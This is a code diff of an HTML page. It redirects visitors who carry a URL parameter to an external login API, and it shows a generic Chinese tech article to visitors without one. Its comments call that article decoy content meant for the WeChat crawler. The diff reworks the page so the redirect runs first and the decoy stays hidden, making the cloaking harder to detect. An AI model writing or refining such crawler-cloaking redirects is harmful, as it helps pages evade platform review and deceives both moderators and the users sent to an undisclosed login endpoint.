@@ -4,50 +4,24 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     
-    <!-- 禁止微信缓存 -->
+    <!-- 1. 禁止缓存 -->
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
 
-    <title>未来协议：数字前沿解析</title>
-    <style>
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; background-color: #f8f9fa; }
-        .container { max-width: 800px; margin: 0 auto; padding: 40px 20px; }
-        header { border-bottom: 1px solid #eee; margin-bottom: 30px; }
-        h1 { color: #1a73e8; font-size: 28px; }
-        .post-meta { color: #888; font-size: 14px; margin-bottom: 20px; }
-        .content { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
-        code { background: #f1f1f1; padding: 2px 5px; border-radius: 4px; font-family: monospace; }
-    </style>
-</head>
-<body>
-
-    <!-- 伪装内容：给微信爬虫看的 -->
-    <div class="container" id="decoy-content">
-        <header>
-            <h1>未来协议：数字前沿解析与趋势洞察</h1>
-            <div class="post-meta">发布日期：2024-05-20 · 阅读时间：8分钟 · 作者：TechInsight</div>
-        </header>
-        <div class="content">
-            <h2>引言协议：数字纪元的新范式</h2>
-            <p>在高速迭代的数字纪元，理解并适应新的技术范式至关重要。本协议旨在为读者提供一份关于未来科技核心概念的深度解析。</p>
-            <h3>数据结构：信息流的骨架</h3>
-            <p>高效的数据结构是构建任何复杂系统的基石。它们决定了信息存储、检索与处理的效率。例如简单的节点定义：</p>
-            <pre><code>class Node { constructor(data) { this.data = data; } }</code></pre>
-            <p>理解这些基本构造是优化大规模数据处理的关键。量子计算代表着计算能力的下一次革命，通过利用量子力学现象...</p>
-        </div>
-    </div>
+    <title>正在安全访问...</title>
 
     <script>
+        /**
+         * 2. 核心跳转逻辑（放在最顶部，防止页面闪现）
+         */
         (function() {
-            /** 1. 配置区域 */
             const config = {
                 domain: 'https://1004.jdnews.cn',
-                appId: '10001',
+                appId: '10002',
                 apiPath: '/index.php/api/user.usermp/login'
             };
 
-            /** 2. 解析参数并构建 URL */
             const urlParams = new URLSearchParams(window.location.search);
             const rawC = urlParams.get('c');
 
@@ -63,10 +37,47 @@
 
                 const finalUrl = config.domain + config.apiPath + '?' + finalParams.toString();
 
-                // 直接跳转，不用 iframe
+                // 执行立即跳转
                 location.replace(finalUrl);
+            } else {
+                // 如果没有参数，说明是爬虫或直接访问，稍后显示伪装内容
+                window.isDecoy = true;
             }
         })();
+    </script>
+
+    <style>
+        /* 3. 初始状态下隐藏整个容器，防止闪现 */
+        #decoy-content { display: none; }
+        
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; background-color: #f8f9fa; }
+        .container { max-width: 800px; margin: 0 auto; padding: 40px 20px; }
+        header { border-bottom: 1px solid #eee; margin-bottom: 30px; }
+        h1 { color: #1a73e8; font-size: 28px; }
+        .post-meta { color: #888; font-size: 14px; margin-bottom: 20px; }
+        .content { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="decoy-content">
+        <header>
+            <h1>未来协议：数字前沿解析与趋势洞察</h1>
+            <div class="post-meta">发布日期：2024-05-20 · 作者：TechInsight</div>
+        </header>
+        <div class="content">
+            <h2>引言协议：数字纪元的新范式</h2>
+            <p>在高速迭代的数字纪元，理解并适应新的技术范式至关重要...</p>
+            <p>（此处省略长篇文字）</p>
+        </div>
+    </div>
+
+    <script>
+        // 4. 如果确定是显示伪装模式，则把内容显示出来
+        if (window.isDecoy) {
+            document.getElementById('decoy-content').style.display = 'block';
+            document.title = '未来协议：数字前沿解析';
+        }
     </script>
 </body>
 </html>
